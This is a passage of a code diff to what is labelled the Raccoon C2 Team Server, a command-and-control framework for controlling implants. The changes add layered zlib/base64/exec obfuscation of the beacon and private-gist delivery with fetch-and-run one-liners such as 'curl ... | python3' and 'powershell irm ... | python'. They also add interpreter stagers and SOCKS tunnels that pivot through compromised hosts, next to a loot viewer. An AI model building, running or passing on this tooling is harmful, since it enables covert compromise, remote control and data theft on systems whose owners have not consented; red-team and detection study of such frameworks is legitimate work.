-            encoded = base64.b64encode(compressed).decode()
-            var_data = _rand_name()
-            var_mod = _rand_name()
-            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'
-
         deob_layers = [{"layer": 0, "label": "Original source", "size": len(payload),
                         "preview": payload[:2000]}]
         stage = payload
         for i in range(layers):
-            stage = _obfuscate_layer(stage, i)
+            stage = _obfuscate_layer(stage, _rand_name())
             deob_layers.append({
                 "layer": i + 1,
                 "label": f"Layer {i + 1}: zlib + base64 + randomized alias",
@@ -1172,18 +1882,39 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 "preview": stage[:2000],
             })
 
-        oneliner_unix = f"python3 -c '{stage}'"
+        # Double quotes on both, with single quotes inside the stage
+        # itself: one text that `sh -c`, `cmd.exe` and PowerShell's
+        # `Invoke-Expression` all hand to `-c` as a single argument. The
+        # stage carries no `$`, backtick, backslash or `"`, which is what
+        # makes the double-quoted form safe in all three. See
+        # `_obfuscate_layer`, and `docs/TUNNEL.md` for why the inline
+        # Windows one-liner is undeliverable at this size regardless.
+        oneliner_unix = f'python3 -c "{stage}"'
         oneliner_win = f'python -c "{stage}"'
+        stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
+                                     oneliner_win)
         _log_event("BEACON-GEN", f"Generated obfuscated beacon ({layers} layers) for {c2_url}")
+        tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GEN")
 
         return jsonify({
             "oneliner_unix": oneliner_unix,
             "oneliner_win": oneliner_win,
+            # The second artifact shape, for a host that may have no
+            # interpreter. It brings one only when it finds none.
+            "stager_nix": stagers["stager_nix"],
+            "stager_win": stagers["stager_win"],
             "layers": layers,
             "c2_url": c2_url,
             "size": len(stage),
             "raw_size": len(payload),
             "deob": list(reversed(deob_layers)),
+            # Which build this is, so the operator can find its SOCKS port
+            # and retire it later. Never the PSK: the credential leaves
+            # this process once, into the artifact.
+            "tunnel_identity": tunnel_identity,
+            # The three per-build values `tools/build_interpreter_bundle.py`
+            # needs on its command line, which nothing else reports.
+            **_layout_for_response(gen_cfg),
         })
 
     # ── Beacon gist delivery ──
@@ -1191,7 +1922,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     @app.route("/api/server/beacon-gist", methods=["POST"])
     @require_auth
     def api_beacon_gist():
-        import zlib, random as _r, string
+        import random as _r, string
 
         try:
             check = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
@@ -1215,31 +1946,23 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
 
-        https_cfg = protocols.get("https", {})
-        dns_cfg = protocols.get("dns", {})
-        smb_cfg = protocols.get("smb", {})
-        quic_cfg = protocols.get("quic", {})
-
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        gen_cfg = {
-            "https": {"enabled": bool(https_cfg.get("enabled")),
-                      "callback_url": https_cfg.get("callback_url", c2_url),
-                      "verify_ssl": False},
-            "dns": {"enabled": bool(dns_cfg.get("enabled")),
-                    "domain": dns_cfg.get("domain", ""),
-                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
-            "smb": {"enabled": bool(smb_cfg.get("enabled")),
-                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
-                    "server": smb_cfg.get("server", "")},
-            "quic": {"enabled": bool(quic_cfg.get("enabled")),
-                     "server": quic_cfg.get("server", "")},
-            "proxy": _proxy_config_from_body(body),
-            "c2_profile": _active_c2_profile or {},
-        }
+        # As in `api_beacon_gen`: before the credential is minted.
+        try:
+            drops = drop_list(body.get("drops"))
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+
+        try:
+            gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+        except RuntimeError as exc:
+            return jsonify({"error": str(exc)}), 500
         config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
@@ -1247,31 +1970,42 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         def _rand_name(n=12):
             return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))
 
-        def _obfuscate_layer(code):
-            compressed = zlib.compress(code.encode("utf-8"), 9)
-            encoded = base64.b64encode(compressed).decode()
-            var_mod = _rand_name()
-            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'
-
         stage = payload
         for _ in range(layers):
-            stage = _obfuscate_layer(stage)
+            stage = _obfuscate_layer(stage, _rand_name())
 
         import tempfile
         tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
         tmp.write(stage)
         tmp.close()
 
+        # The credential was registered before `gh` ran, so every way the
+        # upload can fail to deliver the artifact has to take it back out
+        # again: a non-zero exit, and the `timeout` below, which raises
+        # rather than returning. Every PSK in the store is tried on every
+        # incoming handshake, so one left for a build nobody received is a
+        # candidate walked for ever. `delivered` is set at the last point
+        # from which the artifact is certainly out; nothing after it is
+        # this guard's business.
+        delivered = False
         try:
-            r = subprocess.run(
-                ["gh", "gist", "create", "--public=false", "--filename", filename, tmp.name],
-                capture_output=True, text=True, timeout=30,
-            )
-        finally:
-            os.unlink(tmp.name)
+            try:
+                r = subprocess.run(
+                    ["gh", "gist", "create", "--public=false", "--filename", filename, tmp.name],
+                    capture_output=True, text=True, timeout=30,
+                )
+            finally:
+                os.unlink(tmp.name)
 
-        if r.returncode != 0:
-            return jsonify({"error": f"gh gist create failed: {r.stderr.strip()}"}), 500
+            if r.returncode != 0:
+                return jsonify({"error": f"gh gist create failed: {r.stderr.strip()}"}), 500
+            delivered = True
+        except subprocess.TimeoutExpired:
+            return jsonify({"error": "gh gist create timed out after 30s; "
+                                     "no gist was created"}), 504
+        finally:
+            if not delivered:
+                _retire_generated_tunnel(gen_cfg, data_dir)
 
         gist_url = r.stdout.strip()
         gist_id = gist_url.rstrip("/").split("/")[-1]
@@ -1300,8 +2034,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         oneliner_unix = f"curl -sL '{raw_url}'|python3"
         oneliner_win = f'powershell -c "irm \'{raw_url}\'|python"'
         oneliner_wget = f"wget -qO- '{raw_url}'|python3"
+        stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
+                                     oneliner_win)
 
         _log_event("BEACON-GIST", f"Created gist {gist_id} for {c2_url} (auto-delete on connect)")
+        tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GIST")
 
         return jsonify({
             "gist_id": gist_id,
@@ -1311,8 +2048,15 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "oneliner_unix": oneliner_unix,
             "oneliner_win": oneliner_win,
             "oneliner_wget": oneliner_wget,
+            # The second artifact shape, as in `api_beacon_gen`.
+            "stager_nix": stagers["stager_nix"],
+            "stager_win": stagers["stager_win"],
             "layers": layers,
             "size": len(stage),
+            # As in the other route: the identity, never the PSK.
+            "tunnel_identity": tunnel_identity,
+            # And the build's layout, which the bundle builder requires.
+            **_layout_for_response(gen_cfg),
         })
 
     @app.route("/api/server/beacon-gist/<gist_id>", methods=["DELETE"])
@@ -3322,6 +4066,7 @@ header .info{font-size:11px;color:var(--text2)}
     <span class="info" id="server-info">Listening</span>
     <button class="topbar-ico-btn" onclick="showBeaconGen()" title="Beacon Generator">&#128640;</button>
     <button class="topbar-ico-btn" onclick="showListeners()" title="Listeners">&#128225;</button>
+    <button class="topbar-ico-btn" onclick="showTunnel()" title="Tunnel">&#128268;</button>
     <button class="topbar-ico-btn" onclick="showLootViewer()" title="Loot">&#128142;</button>
     <button class="topbar-ico-btn" onclick="showServerLog()" title="Server Log">&#128220;</button>
     <div class="bell-wrap">
@@ -6447,6 +7192,226 @@ async function drawListeners(panel){
   });
 }
 
+async function showTunnel(){
+  const overlay = document.createElement("div");
+  overlay.className = "loot-overlay";
+  overlay.onclick = e => { if(e.target===overlay) overlay.remove(); };
+  const panel = document.createElement("div");
+  panel.className = "loot-panel";
+  overlay.appendChild(panel);
+  document.body.appendChild(overlay);
+  await drawTunnel(panel);
+}
+
+async function drawTunnel(panel){
+  const head = '<h2>&#128268; Tunnel</h2>'
+    + '<button class="loot-close" onclick="this.closest(\'.loot-overlay\').remove()">&#10005;</button>';
+  panel.innerHTML = head + '<div class="loot-loading">Loading...</div>';
+  let data;
+  try {
+    data = await api("/api/server/tunnel");
+  } catch(e) {
+    panel.innerHTML = head + '<p class="loot-empty">' + esc(String(e.message||e)) + '</p>';
+    return;
+  }
+
+  const srv = data.server || {};
+  const rows = data.endpoints || [];
+  const running = srv.state === "running";
+  const bytes = n => n >= 1048576 ? (n/1048576).toFixed(1)+" MB"
+                   : n >= 1024 ? (n/1024).toFixed(1)+" KB" : (n||0)+" B";
+  // Every refusal kind that is not zero, read off the keys rather than
+  // from a list written here. `refused` is the sum over nine kinds, and
+  // naming three of them turned "5 refused (auth 0, capacity 0, tunnel
+  // 0)" into something a reader takes for a broken panel instead of a
+  // refusal for one of the six that were not shown.
+  const refusals = s => Object.keys(s)
+    .filter(k => k.indexOf("refused_") === 0 && s[k])
+    .map(k => esc(k.slice(8).replace(/_/g," ")) + " " + esc(String(s[k])))
+    .join(", ");
+
+  // The two objects, named here because the panel cannot otherwise show
+  // why one button is immediate and the other is not. A stop that
+  // silently takes five minutes is the cousin of a start button that
+  // silently does nothing, so the latency is written down rather than
+  // left for the operator to discover.
+  let html = head
+    + '<p style="font-size:12px;color:var(--dim);margin:0 0 10px">'
+    + 'The tunnel <strong>server</strong> is a separate process: endpoints '
+    + 'dial in to it and it opens one loopback SOCKS port for each. It '
+    + 'holds the Noise static key and every build\'s pre-shared key, which '
+    + 'is why it is not a listener. <strong>Stopping it drops every '
+    + 'endpoint at once.</strong> An <strong>endpoint</strong> is one '
+    + 'agent\'s tunnel, so starting or stopping one is a task that takes '
+    + 'effect at that agent\'s next check-in, not now.</p>';
+
+  // ── The server: one process, one button, immediate ──
+  html += '<div class="loot-list" id="tunnel-server-block"><div class="loot-item">'
+    + '<div><strong>Tunnel server</strong> <span style="color:var(--dim)">'
+    + esc(String(srv.bind_host||"?")) + ':' + esc(String(srv.bind_port||"?"))
+    + ' &middot; SOCKS ports ' + esc(String(srv.socks_port_first||"?"))
+    + '-' + esc(String(srv.socks_port_last||"?")) + '</span></div>'
+    + '<div style="font-size:12px">state <strong>' + esc(String(srv.state||"unknown")) + '</strong>'
+    + (srv.pid ? ' &middot; pid ' + esc(String(srv.pid)) : '')
+    + (srv.crypto ? ' &middot; crypto ' + esc(String(srv.crypto)) : '')
+    + ' &middot; ' + esc(String((srv.sessions||[]).length)) + ' relay session(s)'
+    + (srv.detail ? ' &mdash; ' + esc(String(srv.detail)) : '')
+    + '</div>'
+    + '<div style="margin-top:6px">'
+    + '<button data-tunnel-server="' + (running ? 'stop' : 'start') + '"'
+    + ' data-endpoint-count="' + esc(String(rows.length)) + '"'
+    + (data.managed ? '' : ' disabled title="' + esc(String(data.detail||srv.detail||"")) + '"')
+    + '>' + (running ? 'Stop' : 'Start') + '</button>'
+    + (running
+       ? '<span style="font-size:11px;color:var(--yellow,#d7ba7d);margin-left:8px">'
+         + 'Stopping drops every endpoint at once &mdash; '
+         + esc(String(rows.length)) + ' connected now.</span>'
+       : '')
+    + (data.managed ? '' :
+       '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
+       + esc(String(data.detail||srv.detail||"")) + '</span>')
+    + '</div></div></div>';
+
+  // ── The endpoints: one row per identity, each one a task away ──
+  html += '<h3 style="font-size:13px;margin:12px 0 6px">Endpoints</h3>';
+  if(!rows.length){
+    html += '<p class="loot-empty">'
+      + esc(data.detail || "No endpoint has connected to this tunnel server yet.")
+      + '</p>';
+  }
+  html += '<div class="loot-list" id="tunnel-endpoint-rows">';
+  rows.forEach(row => {
+    const connected = row.state === "connected";
+    const socks = row.socks;
+    const refused = socks ? refusals(socks) : "";
+    html += '<div class="loot-item">'
+      + '<div><strong>' + esc(row.identity) + '</strong>'
+      + ' <span style="color:var(--dim)">SOCKS 127.0.0.1:' + esc(String(row.port))
+      + ' &middot; ' + (row.linked ? 'agent ' + esc(row.agent) : 'unlinked')
+      + '</span></div>'
+      + '<div style="font-size:12px">state <strong>' + esc(row.state) + '</strong>'
+      + (row.hostname ? ' &middot; ' + esc(row.hostname) : '')
+      + (row.os ? ' &middot; ' + esc(row.os) : '')
+      + (row.peer ? ' &middot; from ' + esc(row.peer) : '')
+      + ' &middot; ' + esc(String(row.sessions)) + ' session(s)'
+      + (socks ? '/' + esc(String(socks.max_sessions)) : '')
+      + ' &middot; in ' + esc(bytes(row.bytes_in))
+      + ' out ' + esc(bytes(row.bytes_out))
+      + '</div>'
+      // The crypto path of both halves, per row. A tunnel on the
+      // pure-Python cipher moves roughly 50-200 KB/s, and an operator
+      // who cannot see that spends the afternoon looking for a network
+      // fault that is not there. Two values because they are two
+      // processes on two hosts and either one bounds the throughput:
+      // `endpoint_crypto` comes from the endpoint's own HELLO and is the
+      // one an `allow_slow_crypto` build is about, `server_crypto` is
+      // this team server, which encrypts every relayed byte as well.
+      + '<div style="font-size:11px;color:'
+      + ((row.endpoint_crypto === "pure-python"
+          || row.server_crypto === "pure-python")
+         ? 'var(--yellow,#d7ba7d)' : 'var(--dim)') + '">'
+      + 'crypto endpoint ' + esc(String(row.endpoint_crypto || "unreported"))
+      + ' &middot; server ' + esc(String(row.server_crypto || "unknown"))
+      + (row.endpoint_crypto === "pure-python"
+         ? ' &mdash; the endpoint is on pure-python AES-GCM, roughly '
+           + '50-200 KB/s: a scan through this tunnel is slow because of '
+           + 'the cipher, not the network'
+         : '')
+      + (row.server_crypto === "pure-python"
+         ? ' &mdash; this team server is on pure-python AES-GCM, roughly '
+           + '50-200 KB/s: it encrypts every relayed byte, so the tunnel '
+           + 'is slow because of the cipher, not the network'
+         : '')
+      + '</div>'
+      + (socks && socks.refused
+         ? '<div style="font-size:11px;color:var(--dim)">'
+           + esc(String(socks.refused)) + ' refused on the SOCKS port'
+           + (refused ? ' &mdash; ' + refused : '')
+           + '</div>'
+         : '')
+      + (row.socks_detail
+         ? '<div style="font-size:11px;color:var(--dim)">' + esc(row.socks_detail) + '</div>'
+         : '')
+      + (row.username
+         ? '<div style="font-size:11px;color:var(--dim)">'
+           + 'SOCKS5 user/pass per RFC 1929: ' + esc(row.username)
+           + ' / ' + esc(row.password) + '</div>'
+         : '')
+      // Why a tunnel refused to start. The endpoint child's stderr is
+      // closed, so this sentence reaches an operator here or nowhere.
+      + (row.refusal
+         ? '<div style="font-size:11px;color:var(--red,#ff1a1a)">' + esc(row.refusal) + '</div>'
+         : '')
+      + '<div style="margin-top:6px">'
+      + (row.pending
+         ? '<button disabled>pending until ~' + esc(row.expected) + '</button>'
+         : '<button data-tunnel-endpoint="' + esc(row.identity) + '"'
+           + ' data-endpoint-action="' + (connected ? 'stop' : 'start') + '"'
+           + (row.linked ? '' : ' disabled title="' + esc(row.detail) + '"')
+           + '>' + (connected ? 'Stop' : 'Start') + '</button>')
+      + (row.detail
+         ? '<span style="font-size:11px;color:var(--dim);margin-left:8px">'
+           + esc(row.detail) + '</span>'
+         : '')
+      + '</div></div>';
+  });
+  html += '</div>';
+  panel.innerHTML = html;
+
+  // Handlers attached here rather than written into an onclick
+  // attribute. An identity, a hostname and a refusal all come from
+  // outside this process, and a handler body built as a string is the
+  // defect class the hardening pass of November 2026 removed from this
+  // file.
+  panel.querySelectorAll('button[data-tunnel-server]').forEach(btn => {
+    if(btn.disabled) return;
+    btn.addEventListener("click", async () => {
+      const action = btn.getAttribute("data-tunnel-server");
+      const count = btn.getAttribute("data-endpoint-count");
+      // Asked before anything is sent: this is the one control here that
+      // takes something away from every operator at once.
+      if(action === "stop" && !confirm(
+           "Stopping the tunnel server drops every endpoint at once: "
+           + count + " connected now. Each one has to be tasked "
+           + "'tunnel start' again, which takes effect at that agent's "
+           + "next check-in. Stop it?")) return;
+      btn.disabled = true;
+      btn.textContent = action === "start" ? "Starting..." : "Stopping...";
+      try {
+        const r = await fetch("/api/server/tunnel/" + action,
+                              {method:"POST", headers:H()});
+        const body = await r.json();
+        if(!r.ok) alert(body.error || ("tunnel server " + action + " failed"));
+        else if(body.detail) alert(body.detail);
+      } catch(e) {
+        alert(String(e.message||e));
+      }
+      await drawTunnel(panel);
+    });
+  });
+
+  panel.querySelectorAll('button[data-tunnel-endpoint]').forEach(btn => {
+    if(btn.disabled) return;
+    btn.addEventListener("click", async () => {
+      const identity = btn.getAttribute("data-tunnel-endpoint");
+      const action = btn.getAttribute("data-endpoint-action");
+      btn.disabled = true;
+      btn.textContent = "Queueing...";
+      try {
+        const r = await fetch("/api/server/tunnel/endpoint/"
+                              + encodeURIComponent(identity) + "/" + action,
+                              {method:"POST", headers:H()});
+        const body = await r.json();
+        if(!r.ok) alert(body.error || ("tunnel " + action + " failed"));
+        else if(body.detail) alert(body.detail);
+      } catch(e) {
+        alert(String(e.message||e));
+      }
+      await drawTunnel(panel);
+    });
+  });
+}
+
 async function showLootViewer(){
   const overlay = document.createElement("div");
   overlay.className = "loot-overlay";
@@ -8151,6 +9116,44 @@ def _build_supervisor(args, parser):
                       listener_token=token)
 
 
+def _build_tunnel_supervisor(args, parser):
+    """A TunnelSupervisor for `c2.tunnel_server` in `--config`, or None.
+
+    Imported here rather than at the top of the file for the reason
+    `_build_supervisor` is: a deployment that configures no tunnel server
+    should not load the module that spawns one. This import is cheaper
+    than the listeners' -- the supervisor spawns a child and holds no
+    protocol code at all -- but the rule is the same one.
+
+    A block that cannot be run is fatal with the field named, rather than
+    a warning. A tunnel server that was silently not configured shows up
+    as an endpoint that never appears, and so do a wrong PSK, a blocked
+    egress and a proxy that refuses CONNECT; an operator chasing it has
+    no way to tell those apart.
+    """
+    if not args.config:
+        return None
+
+    import yaml
+
+    from software.c2.tunnel.supervisor import (TunnelSupervisor,
+                                               tunnel_server_config)
+
+    try:
+        with open(args.config) as handle:
+            config = yaml.safe_load(handle) or {}
+    except (OSError, yaml.YAMLError) as exc:
+        parser.error("could not read %s: %s" % (args.config, exc))
+    try:
+        block = tunnel_server_config(config)
+    except ValueError as exc:
+        parser.error("%s: %s" % (args.config, exc))
+    if block is None:
+        return None
+    return TunnelSupervisor(block, Path(args.data_dir),
+                            managed=not args.no_manage_listeners)
+
+
 def main():
     parser = argparse.ArgumentParser(
         description="Raccoon C2 Team Server",
@@ -8187,17 +9190,17 @@ def main():
     )
     parser.add_argument(
         "--config",
-        help="raccoon.yaml to read c2.listeners from, so the 📡 panel can "
-             "list, start and stop them. Without it the panel says that "
-             "none are configured, which is what every deployment before "
-             "this feature should see.")
+        help="raccoon.yaml to read c2.listeners and c2.tunnel_server from, "
+             "so the 📡 and 🔌 panels can list, start and stop them. "
+             "Without it both panels say that nothing is configured, which "
+             "is what every deployment before these features should see.")
     parser.add_argument(
         "--no-manage-listeners", action="store_true",
-        help="List and report on listeners but refuse to start or stop "
-             "them. For a team server that has no business spawning "
-             "processes -- in a container, where mounting the Docker "
-             "socket would hand the container its host. The panel then "
-             "disables its controls and states the reason.")
+        help="List and report on listeners and the tunnel server but "
+             "refuse to start or stop them. For a team server that has no "
+             "business spawning processes -- in a container, where mounting "
+             "the Docker socket would hand the container its host. Both "
+             "panels then disable their controls and state the reason.")
     args = parser.parse_args()
     # 0 would bind an ephemeral port that the socket policy never matches:
     # the GUI would be locked out, or beacons sent nowhere, with nothing said.
@@ -8264,10 +9267,12 @@ def main():
         "start_time": time.time(),
     }
     supervisor = _build_supervisor(args, parser)
+    tunnel_supervisor = _build_tunnel_supervisor(args, parser)
     app = create_app(crypto, operator_token, data_dir, server_config=srv_config,
                      operator_port=args.operator_port if split else None,
                      listener_token=os.environ.get("RACCOON_LISTENER_TOKEN"),
-                     supervisor=supervisor)
+                     supervisor=supervisor,
+                     tunnel_supervisor=tunnel_supervisor)
 
     if not split:
         network = (f"  Listen:   {proto}://{args.host}:{args.port}"
@@ -8321,7 +9326,15 @@ def main():
                for host, port in listeners]
     for extra in servers[1:]:
         threading.Thread(target=extra.serve_forever, daemon=True).start()
-    servers[0].serve_forever()
+    try:
+        servers[0].serve_forever()
+    finally:
+        # The tunnel server is a child of this process and holds the
+        # implant-facing port and every build's PSK in memory. Left
+        # behind it would keep that port against the next start, and the
+        # operator would have no panel to stop it from.
+        if tunnel_supervisor is not None:
+            tunnel_supervisor.stop_all()
 
 
 def _is_loopback(host: str) -> bool:
